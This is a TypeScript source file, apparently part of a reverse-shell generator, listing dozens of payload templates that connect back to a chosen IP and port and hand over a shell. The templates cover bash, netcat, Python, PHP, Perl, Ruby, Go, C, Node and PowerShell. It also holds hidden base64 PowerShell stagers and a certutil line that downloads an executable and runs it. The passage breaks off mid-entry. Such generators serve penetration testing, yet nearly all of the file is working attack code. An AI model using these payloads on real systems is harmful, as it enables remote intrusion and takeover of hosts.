import { bytesToBase64 } from "../encoding/bytes";
import { utf16leBytes } from "../hash/bytes";
import { OsFamily, ShellParams } from "./params";

export type ShellId = string;

export interface ShellFileSpec {
  extension: string;
  defaultMime: string;
  /** Produces the on-disk file body. Defaults to the raw one-liner text (with a "#!/bin/bash"
   *  shebang prepended for the shell-invoked variants) when omitted — see shShebang() below. */
  toFileBody?: (oneLiner: string, params: ShellParams) => string;
}

export interface ShellVariant {
  id: ShellId;
  label: string;
  group: string;
  /** One or more OS families this payload is verified to work on. Payloads that work on both
   *  Linux and macOS list both rather than using a separate "cross-platform" bucket — but only
   *  when actually verified per-payload; e.g. bash's /dev/tcp trick is Linux-only because macOS's
   *  bundled bash 3.2 isn't built with --enable-net-redirections. */
  os: OsFamily[];
  /** Whether the shell-path input applies to this variant. Several payloads hardcode /bin/sh
   *  internally (confirmed during syntax verification) rather than taking a configurable path. */
  usesShellPath: boolean;
  /** A short, user-facing caveat about availability/preconditions — shown next to the picker.
   *  Every entry that isn't as universally available as plain bash/nc carries one of these rather
   *  than presenting itself with false confidence. */
  note?: string;
  render: (params: ShellParams) => string;
  /** Present only for variants with a genuine alternate encoded execution form (currently just
   *  PowerShell/pwsh's -EncodedCommand, which requires UTF-16LE-then-base64, not UTF-8). */
  renderEncoded?: (params: ShellParams) => string;
  /** Overrides the generic `nc -lvnp <port>` companion listener for variants that pair with a
   *  different listener (e.g. socat, or anything requiring --ssl/TLS). */
  listener?: (params: ShellParams) => string;
  /** Marks which of ip/port DON'T appear literally in render()'s output — used by LOLBin stagers
   *  (rundll32/mshta/regsvr32/vbs/jscript/java-windows) where the target is either embedded inside
   *  a base64 blob or, for the download-and-execute stagers, not part of the one-liner at all
   *  (the hosted file, not this command, would establish the actual back-connection). */
  opaqueParams?: ("ip" | "port")[];
  file: ShellFileSpec;
}

const TEXT_PLAIN = "text/plain";

function shShebang(oneLiner: string): string {
  return `#!/bin/bash\n${oneLiner}\n`;
}

function powershellScript(p: ShellParams): string {
  return (
    `$client = New-Object System.Net.Sockets.TCPClient('${p.ip}',${p.port});` +
    `$stream = $client.GetStream();` +
    `[byte[]]$bytes = 0..65535|%{0};` +
    `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;` +
    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);` +
    `$sendback = (iex $data 2>&1 | Out-String );` +
    `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';` +
    `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);` +
    `$stream.Write($sendbyte,0,$sendbyte.Length);` +
    `$stream.Flush()};` +
    `$client.Close()`
  );
}

function powershellTlsScript(p: ShellParams): string {
  return (
    `$Socket = New-Object System.Net.Sockets.TcpClient('${p.ip}', ${p.port});` +
    `$Stream = $Socket.GetStream();` +
    `$SslStream = New-Object System.Net.Security.SslStream($Stream, $false, ({$True} -as [Net.Security.RemoteCertificateValidationCallback]));` +
    `$SslStream.AuthenticateAsClient('${p.ip}');` +
    `[byte[]]$Bytes = 0..65535 | ForEach-Object {0};` +
    `while (($I = $SslStream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {` +
    `$Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes, 0, $I);` +
    `$SendBack = (Invoke-Expression $Data 2>&1 | Out-String);` +
    `$SendBack2 = $SendBack + 'PS ' + (Get-Location).Path + '> ';` +
    `$SendByte = ([Text.Encoding]::ASCII).GetBytes($SendBack2);` +
    `$SslStream.Write($SendByte, 0, $SendByte.Length);` +
    `$SslStream.Flush()};` +
    `$Socket.Close()`
  );
}

/** Base64(UTF-16LE) blob for `powershell -e` — shared by every LOLBin stager below (rundll32,
 *  mshta, regsvr32's cousins, VBScript, JScript, Windows Java) so they launch a real, functional
 *  stager instead of the reference file's literal `<BASE64_PAYLOAD>` placeholder. */
function encodedPsBlob(p: ShellParams): string {
  return bytesToBase64(utf16leBytes(powershellScript(p)));
}

export const SHELLS: ShellVariant[] = [
  {
    id: "bash-dev-tcp",
    label: "Bash -i (/dev/tcp)",
    group: "Bash",
    os: ["linux"],
    usesShellPath: true,
    note: "Needs a bash build with --enable-net-redirections (default on most distros) — won't work under dash/sh. macOS's bundled /bin/bash (3.2) isn't built with this flag, so this doesn't work out of the box on Mac.",
    render: (p) => `${p.shellPath} -i >& /dev/tcp/${p.ip}/${p.port} 0>&1`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "bash-dev-tcp-wrapped",
    label: "Bash -i (/dev/tcp, restricted-shell wrapper)",
    group: "Bash",
    os: ["linux"],
    usesShellPath: true,
    note: "Wraps the /dev/tcp trick in `bash -c` — useful when the current shell itself is restricted. Same macOS caveat as the plain /dev/tcp variant: stock /bin/bash on Mac lacks net redirection support.",
    render: (p) => `bash -c '${p.shellPath} -i >& /dev/tcp/${p.ip}/${p.port} 0>&1'`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nc-e",
    label: "Netcat -e (traditional/GNU)",
    group: "Netcat",
    os: ["linux"],
    usesShellPath: true,
    note: "OpenBSD nc — the default on modern Debian/Ubuntu/Kali — does NOT support -e. Needs netcat-traditional or GNU netcat. macOS's bundled nc is also built without -e support, so this requires installing GNU netcat there too.",
    render: (p) => `nc -e ${p.shellPath} ${p.ip} ${p.port}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nc-openbsd-c-flag",
    label: "Netcat -c (OpenBSD nc)",
    group: "Netcat",
    os: ["linux"],
    usesShellPath: true,
    note: "OpenBSD nc's -c flag (present on Debian/Ubuntu's nc-openbsd package and similar builds) runs the shell via /bin/sh -c — not universal, some OpenBSD nc builds omit it entirely. Check `nc -h` first, or fall back to the mkfifo variant.",
    render: (p) => `nc -c ${p.shellPath} ${p.ip} ${p.port}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nc-mkfifo-linux",
    label: "Netcat (mkfifo, no -e needed)",
    group: "Netcat",
    os: ["linux"],
    usesShellPath: true,
    note: "Works with any Linux nc build, including OpenBSD nc, since it avoids -e entirely.",
    render: (p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${p.shellPath} -i 2>&1|nc ${p.ip} ${p.port} >/tmp/f`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nc-mkfifo-mac",
    label: "Netcat (mkfifo, BSD nc)",
    group: "Netcat",
    os: ["mac"],
    usesShellPath: true,
    note: "macOS ships BSD nc (no -e flag) — this is the verified Mac-native mkfifo ordering: create the fifo first, redirect the shell into it, then clean up.",
    render: (p) => `mkfifo /tmp/f;${p.shellPath} -i < /tmp/f 2>&1|nc ${p.ip} ${p.port} > /tmp/f;rm /tmp/f`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "ncat-exec",
    label: "Ncat --exec",
    group: "Netcat",
    os: ["linux", "mac"],
    usesShellPath: true,
    note: "Nmap's ncat always supports exec, unlike OpenBSD nc — but it isn't preinstalled on Linux or Mac, so the target needs Nmap (or standalone Ncat) installed first.",
    render: (p) => `ncat ${p.ip} ${p.port} -e ${p.shellPath}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "ncat-ssl",
    label: "Ncat --ssl --exec (TLS)",
    group: "Netcat",
    os: ["linux", "mac"],
    usesShellPath: true,
    note: "Requires Ncat (bundled with Nmap), not preinstalled on either OS. The attacker listener must also use --ssl (e.g. `ncat --ssl -lvp <port>`) or the TLS handshake will fail.",
    render: (p) => `ncat --ssl ${p.ip} ${p.port} -e ${p.shellPath}`,
    listener: (p) => `ncat --ssl -lvp ${p.port}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "zsh-ztcp",
    label: "Zsh (ztcp)",
    group: "Zsh",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Needs zsh built with the zsh/net/tcp module (ztcp) — present in macOS's default zsh and most Linux zsh packages, but stripped from some minimal builds. Preferred over bash's /dev/tcp trick on Mac, since macOS's bundled bash (3.2) lacks net-redirection support.",
    render: (p) => `zsh -c 'zmodload zsh/net/tcp && ztcp ${p.ip} ${p.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "python",
    label: "Python (python)",
    group: "Python",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "The `python` binary may not exist on modern systems (removed from most current Linux distros and from macOS since Catalina) — use the python3 variant if this fails.",
    render: (p) =>
      `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${p.ip}",${p.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
    file: {
      extension: "py",
      defaultMime: "text/x-python",
      toFileBody: (_o, p) =>
        `import socket, os, pty\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${p.ip}", ${p.port}))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\npty.spawn("/bin/sh")\n`,
    },
  },
  {
    id: "python3",
    label: "Python (python3)",
    group: "Python",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "macOS doesn't ship python3 out of the box on recent releases — first invocation typically triggers an Xcode Command Line Tools install prompt.",
    render: (p) =>
      `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${p.ip}",${p.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
    file: {
      extension: "py",
      defaultMime: "text/x-python",
      toFileBody: (_o, p) =>
        `import socket, os, pty\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${p.ip}", ${p.port}))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\npty.spawn("/bin/sh")\n`,
    },
  },
  {
    id: "python-windows",
    label: "Python (Windows, subprocess)",
    group: "Python",
    os: ["windows"],
    usesShellPath: false,
    note: "Same connect-and-redirect approach as the Linux/Mac Python payload, but spawns cmd.exe via subprocess instead of pty.spawn — Windows has no pty module.",
    render: (p) =>
      `python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${p.ip}',${p.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])"`,
    file: {
      extension: "py",
      defaultMime: "text/x-python",
      toFileBody: (_o, p) =>
        `import socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${p.ip}", ${p.port}))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\np = subprocess.call(["cmd.exe"])\n`,
    },
  },
  {
    id: "php-exec",
    label: "PHP (exec/fsockopen)",
    group: "PHP",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Fails if exec() is in disable_functions (common on shared hosting) — try the proc_open variant instead.",
    render: (p) => `php -r '$sock=fsockopen("${p.ip}",${p.port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    file: {
      extension: "php",
      defaultMime: "application/x-httpd-php",
      toFileBody: (_o, p) => `<?php\n$sock = fsockopen("${p.ip}", ${p.port});\nexec("/bin/sh -i <&3 >&3 2>&3");\n`,
    },
  },
  {
    id: "php-proc-open",
    label: "PHP (proc_open fallback)",
    group: "PHP",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Use when exec()/shell_exec() are disabled but proc_open() isn't.",
    render: (p) =>
      `php -r '$sock=fsockopen("${p.ip}",${p.port});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
    file: {
      extension: "php",
      defaultMime: "application/x-httpd-php",
      toFileBody: (_o, p) =>
        `<?php\n$sock = fsockopen("${p.ip}", ${p.port});\n$pipes = [];\n$proc = proc_open("/bin/sh -i", [0 => $sock, 1 => $sock, 2 => $sock], $pipes);\n`,
    },
  },
  {
    id: "perl",
    label: "Perl",
    group: "Perl",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "macOS still ships /usr/bin/perl (with a deprecation warning on recent releases) — works but Apple may drop it in a future major version.",
    render: (p) =>
      `perl -e 'use Socket;$i="${p.ip}";$p=${p.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    file: {
      extension: "pl",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `#!/usr/bin/perl\nuse Socket;\n$i = "${p.ip}";\n$p = ${p.port};\nsocket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));\nif (connect(S, sockaddr_in($p, inet_aton($i)))) {\n  open(STDIN, ">&S");\n  open(STDOUT, ">&S");\n  open(STDERR, ">&S");\n  exec("/bin/sh -i");\n}\n`,
    },
  },
  {
    id: "perl-fork",
    label: "Perl (fork + IO::Socket)",
    group: "Perl",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Alternate classic Perl one-liner using fork()+IO::Socket instead of raw Socket calls — needs the core IO module (bundled with Perl 5) rather than exec()'ing /bin/sh -i directly.",
    render: (p) =>
      `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${p.ip}:${p.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
    file: { extension: "pl", defaultMime: TEXT_PLAIN, toFileBody: (o) => `${o}\n` },
  },
  {
    id: "ruby",
    label: "Ruby",
    group: "Ruby",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "macOS still ships a system ruby (deprecated since Monterey, but present) — works but expect a deprecation warning on stderr.",
    render: (p) => `ruby -rsocket -e'f=TCPSocket.open("${p.ip}",${p.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    file: {
      extension: "rb",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `#!/usr/bin/env ruby\nrequire 'socket'\nf = TCPSocket.open("${p.ip}", ${p.port}).to_i\nexec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)\n`,
    },
  },
  {
    id: "socat",
    label: "Socat",
    group: "Socat",
    os: ["linux", "mac"],
    usesShellPath: true,
    note: "Requires the socat binary on the target — not installed by default on most distros or on macOS (needs `brew install socat`). Pairs with a socat listener, not plain nc.",
    render: (p) => `socat exec:'${p.shellPath} -li',pty,stderr,setsid,sigint,sane tcp:${p.ip}:${p.port}`,
    listener: (p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p.port}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "awk",
    label: "Awk (gawk only)",
    group: "Awk",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Requires gawk specifically — the /inet/tcp special file is a gawk extension. Silently fails on mawk/BusyBox awk, and also on macOS's default BSD awk (needs `brew install gawk`, then run as gawk).",
    render: (p) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${p.ip}/${p.port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "telnet",
    label: "Telnet (mkfifo)",
    group: "Telnet",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Telnet has no native fd redirection, so this relies on the same mkfifo trick as the netcat variant. Most modern Linux distros and macOS (since Sierra) no longer ship a telnet client by default — install one first.",
    render: (p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet ${p.ip} ${p.port} >/tmp/f`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nodejs",
    label: "Node.js",
    group: "Node.js",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Requires node on the target — uncommon outside dev boxes or Node-based app containers. Spawns /bin/sh, so this targets Unix hosts only, not Windows.",
    render: (p) =>
      `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${p.port},"${p.ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'`,
    file: {
      extension: "js",
      defaultMime: "text/javascript",
      toFileBody: (_o, p) =>
        `const net = require("net");\nconst cp = require("child_process");\nconst sh = cp.spawn("/bin/sh", []);\nconst client = new net.Socket();\nclient.connect(${p.port}, "${p.ip}", function () {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n});\n`,
    },
  },
  {
    id: "deno",
    label: "Deno",
    group: "Deno",
    os: ["linux"],
    usesShellPath: false,
    note: "Requires the Deno runtime and explicit permissions: `deno run --allow-net --allow-run reverseshell.js`. Not confirmed working unmodified on Mac, unlike Node.js.",
    render: (p) =>
      `const conn = await Deno.connect({ hostname: "${p.ip}", port: ${p.port} });\nconst process = Deno.run({\n  cmd: ["/bin/sh"],\n  stdin: "piped",\n  stdout: "piped",\n  stderr: "piped",\n});\nawait Promise.all([\n  conn.readable.pipeTo(process.stdin.writable),\n  process.stdout.readable.pipeTo(conn.writable),\n]);\n`,
    file: { extension: "js", defaultMime: "text/javascript", toFileBody: (o) => `${o}` },
  },
  {
    id: "lua",
    label: "Lua",
    group: "Lua",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Requires the luasocket library — not part of stock Lua and frequently absent even when the lua binary exists. Lua itself isn't preinstalled on macOS either (needs `brew install lua luarocks` + luasocket).",
    render: (p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${p.ip}','${p.port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    file: {
      extension: "lua",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `require('socket')\nrequire('os')\nt = socket.tcp()\nt:connect('${p.ip}', '${p.port}')\nos.execute('/bin/sh -i <&3 >&3 2>&3')\n`,
    },
  },
  {
    id: "golang",
    label: "Golang (go run)",
    group: "Golang",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Needs the full Go toolchain installed on the target, not just a compiled binary — uncommon outside dev/CI hosts. Runs /bin/sh, so this targets Unix hosts only, not Windows.",
    render: (p) =>
      `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${p.ip}:${p.port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
    file: {
      extension: "go",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `package main\n\nimport (\n\t"net"\n\t"os/exec"\n)\n\nfunc main() {\n\tc, _ := net.Dial("tcp", "${p.ip}:${p.port}")\n\tcmd := exec.Command("/bin/sh")\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\n`,
    },
  },
  {
    id: "golang-windows",
    label: "Golang (Windows, cmd.exe)",
    group: "Golang",
    os: ["windows"],
    usesShellPath: false,
    note: "Needs the Go toolchain (or a precompiled binary) on the target — same requirement as the Linux/Mac Golang variant, just targeting cmd.exe instead of /bin/sh.",
    render: (p) =>
      `package main\nimport("net";"os/exec")\nfunc main(){\n  c,_ := net.Dial("tcp","${p.ip}:${p.port}")\n  cmd := exec.Command("cmd.exe")\n  cmd.Stdin = c\n  cmd.Stdout = c\n  cmd.Stderr = c\n  cmd.Run()\n}\n`,
    file: { extension: "go", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "java-runtime",
    label: "Java (Runtime.exec)",
    group: "Java",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Groovy syntax (`as String[]` is a Groovy cast, not valid Java) — only runs inside an actual Groovy interpreter, e.g. a Groovy script console/engine embedded in the target app. It will fail under jshell or plain javac, which only accept standard Java.",
    render: (p) =>
      `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${p.ip}/${p.port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
    file: { extension: "java", defaultMime: "text/x-java-source", toFileBody: (o) => o },
  },
  {
    id: "java-windows",
    label: "Java (Windows, PowerShell stager)",
    group: "Java",
    os: ["windows"],
    usesShellPath: false,
    note: "Same JVM Runtime.exec() approach as the Linux/Mac Java payload, but launches a PowerShell -EncodedCommand stager targeting cmd.exe instead of /bin/bash. The target IP/port are embedded inside the base64 blob, not shown in plaintext here.",
    render: (p) =>
      `r = Runtime.getRuntime()\np = r.exec(["cmd.exe","/c","powershell -nop -w hidden -e ${encodedPsBlob(p)}"] as String[])\np.waitFor()`,
    opaqueParams: ["ip", "port"],
    file: { extension: "java", defaultMime: "text/x-java-source", toFileBody: (o) => o },
  },
  {
    id: "c-posix",
    label: "C (POSIX sockets)",
    group: "C",
    os: ["linux", "mac"],
    usesShellPath: false,
    note: "Requires compiling for the target (gcc/cc) — ship the source and compile in place, or cross-compile ahead of time. Uses POSIX sockets, so it applies to Linux and Mac; Windows needs the separate Winsock variant below.",
    render: (p) =>
      `#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    struct sockaddr_in revsockaddr;\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(${p.port});\n    revsockaddr.sin_addr.s_addr = inet_addr("${p.ip}");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char *const argvv[] = {"/bin/sh", NULL};\n    execve("/bin/sh", argvv, NULL);\n    return 0;\n}\n// compile: gcc revshell.c -o revshell && ./revshell\n`,
    file: { extension: "c", defaultMime: "text/x-csrc", toFileBody: (o) => o },
  },
  {
    id: "c-winsock",
    label: "C (Windows, Winsock)",
    group: "C",
    os: ["windows"],
    usesShellPath: false,
    note: "Uses the Winsock API (WSASocket/WSAConnect) — a completely different socket layer from the POSIX variant. Cross-compile with MinGW (`x86_64-w64-mingw32-gcc`) or build natively with MSVC/Visual Studio.",
    render: (p) =>
      `#include <winsock2.h>\n#pragma comment(lib,"ws2_32")\n\nint main(void) {\n    WSADATA wsaData;\n    SOCKET Winsock;\n    struct sockaddr_in hax;\n    STARTUPINFO ini_processo;\n    PROCESS_INFORMATION processo_info;\n    WSAStartup(MAKEWORD(2,2), &wsaData);\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\n    struct hostent *host;\n    host = gethostbyname("${p.ip}");\n    hax.sin_family = AF_INET;\n    hax.sin_port = htons(${p.port});\n    hax.sin_addr = *((struct in_addr *)host->h_addr);\n\n    WSAConnect(Winsock, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n    memset(&ini_processo, 0, sizeof(ini_processo));\n    ini_processo.cb = sizeof(ini_processo);\n    ini_processo.dwFlags = STARTF_USESTDHANDLES;\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n\n    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n    return 0;\n}\n// compile: x86_64-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32\n`,
    file: { extension: "c", defaultMime: "text/x-csrc", toFileBody: (o) => o },
  },
  {
    id: "dart",
    label: "Dart",
    group: "Dart",
    os: ["linux"],
    usesShellPath: false,
    note: "Requires the Dart SDK/runtime on the target (`dart run reverseshell.dart`) — uncommon outside dev environments. Not confirmed working unmodified on Mac.",
    render: (p) =>
      `import 'dart:io';\nmain() {\n  Socket.connect("${p.ip}", ${p.port}).then((socket) {\n    socket.listen((data) {\n      Process.start('/bin/sh', []).then((process) {\n        process.stdin.add(data);\n        process.stdout.listen((d) => socket.add(d));\n      });\n    });\n  });\n}\n`,
    file: { extension: "dart", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "crystal",
    label: "Crystal",
    group: "Crystal",
    os: ["linux"],
    usesShellPath: false,
    note: "Requires the `crystal` binary to run via `crystal run reverseshell.cr`, or a Crystal toolchain to compile ahead of time — rarely present outside dev/CI hosts. Not confirmed working unmodified on Mac.",
    render: (p) =>
      `require "socket"\nrequire "process"\n\nsock = TCPSocket.new("${p.ip}", ${p.port})\nwhile cmd = sock.gets\n  output = Process.run("/bin/sh", ["-c", cmd], output: Process::Redirect::Pipe) do |proc|\n    proc.output.gets_to_end\n  end\n  sock.puts(output)\nend\n`,
    file: { extension: "cr", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "swift-socket",
    label: "Swift (incomplete — needs socket wiring)",
    group: "Swift",
    os: ["mac"],
    usesShellPath: false,
    note: "INCOMPLETE — this only spawns /bin/sh locally with pipes; it does not wire those pipes to a network socket at the target/port. Manual BSD-sockets plumbing is required before this is a working reverse shell. Included because Swift is a genuinely Mac-native language, not as a copy-paste-ready payload.",
    render: (p) =>
      `import Foundation\n\nlet task = Process()\ntask.launchPath = "/bin/sh"\nlet inPipe = Pipe(), outPipe = Pipe()\ntask.standardInput = inPipe\ntask.standardOutput = outPipe\ntask.standardError = outPipe\ntask.launch()\n\n// TODO: pair inPipe/outPipe with a raw BSD socket connection to ${p.ip}:${p.port}\n// (full socket wiring intentionally omitted — see note above)\n`,
    file: { extension: "swift", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "osascript-shell",
    label: "osascript (AppleScript, novelty)",
    group: "AppleScript",
    os: ["mac"],
    usesShellPath: true,
    note: "Wraps `nc -e` inside AppleScript's `do shell script` — inherits the same limitation as the standalone Netcat -e variant: macOS's bundled BSD nc has no -e flag, so GNU netcat must be installed first (`brew install netcat`). Novelty/proof-of-concept option not typically found in other reverse-shell generators.",
    render: (p) => `osascript -e 'do shell script "nc -e ${p.shellPath} ${p.ip} ${p.port}"'`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "powershell",
    label: "PowerShell TCP client",
    group: "PowerShell",
    os: ["windows"],
    usesShellPath: false,
    render: (p) => `powershell -nop -c "${powershellScript(p)}"`,
    renderEncoded: (p) => {
      const bytes = utf16leBytes(powershellScript(p));
      return `powershell -nop -w hidden -e ${bytesToBase64(bytes)}`;
    },
    file: {
      extension: "ps1",
      defaultMime: "application/octet-stream",
      toFileBody: (_o, p) => `${powershellScript(p)}\n`,
    },
  },
  {
    id: "powershell-tls",
    label: "PowerShell TCP client (TLS/SSL)",
    group: "PowerShell",
    os: ["windows"],
    usesShellPath: false,
    note: "The attacker-side listener must also be TLS-configured (e.g. `ncat --ssl -lvp <port>` or `openssl s_server -quiet -key key.pem -cert cert.pem -port <port>`) — a plain nc listener will not complete the SSL handshake.",
    render: (p) => `powershell -nop -c "${powershellTlsScript(p)}"`,
    renderEncoded: (p) => {
      const bytes = utf16leBytes(powershellTlsScript(p));
      return `powershell -nop -w hidden -e ${bytesToBase64(bytes)}`;
    },
    listener: (p) => `ncat --ssl -lvp ${p.port}`,
    file: {
      extension: "ps1",
      defaultMime: "application/octet-stream",
      toFileBody: (_o, p) => `${powershellTlsScript(p)}\n`,
    },
  },
  {
    id: "pwsh-core",
    label: "PowerShell Core (pwsh)",
    group: "PowerShell",
    os: ["linux", "mac", "windows"],
    usesShellPath: false,
    note: "PowerShell Core (pwsh) isn't preinstalled anywhere by default — needs a manual install on Linux/Mac, and on Windows only ships out of the box on some newer builds. Confirm `pwsh` exists before relying on this over Windows PowerShell's built-in `powershell.exe`.",
    render: (p) => `pwsh -nop -w hidden -c "${powershellScript(p)}"`,
    renderEncoded: (p) => {
      const bytes = utf16leBytes(powershellScript(p));
      return `pwsh -nop -w hidden -e ${bytesToBase64(bytes)}`;
    },
    file: {
      extension: "ps1",
      defaultMime: "application/octet-stream",
      toFileBody: (_o, p) => `${powershellScript(p)}\n`,
    },
  },
  {
    id: "certutil-download",
    label: "certutil (download + execute staged .exe)",
    group: "Living-off-the-Land",
    os: ["windows"],
    usesShellPath: false,
    note: "Requires hosting a payload (e.g. shell.exe) on an attacker web server first — e.g. `python3 -m http.server 8080` — at the URL used below. certutil is a built-in Windows binary being abused purely for its download capability; the port shown (8080) is just the hosting-server port, not your reverse-shell LPORT, which lives inside whatever you host.",
    render: (p) => `certutil -urlcache -split -f http://${p.ip}:8080/shell.exe shell.exe && shell.exe`,
    opaqueParams: ["port"],
    file: { extension: "bat", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "nc-exe",
    label: "nc.exe -e cmd.exe",
    group: "Netcat",
    os: ["windows"],
    usesShellPath: false,
